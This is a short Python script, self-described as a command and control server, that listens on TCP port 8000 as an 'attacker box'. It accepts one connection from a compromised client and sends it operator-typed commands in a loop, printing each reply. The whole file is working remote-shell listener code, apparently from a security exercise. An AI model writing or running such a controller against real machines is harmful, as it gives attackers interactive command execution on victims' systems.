# Command and control (CNC) server
# 1. Accepting connections from clients
# 2. Sending and receiving commands

from socket import *

# Create IPv4 TCP socket
serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)

# OS can reuse a socket that was recently used
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
# Bind to a port on the machine, empty IP defaults to the IP address assigned to the machine
serverSocket.bind(('', serverPort))
# Listen to one connection
serverSocket.listen(1)
print("Attacker box listening and awaiting instructions")

# Once client connects to socket, accept the connection and return a connection object
connectionSocket, addr = serverSocket.accept()
print("Thanks for connecting to me " + str(addr))

message = connectionSocket.recv(1024)
print(message)

# Send and receive commands
command = ""
while command != "exit":
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)

# Configure connection for a getaway and close
connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()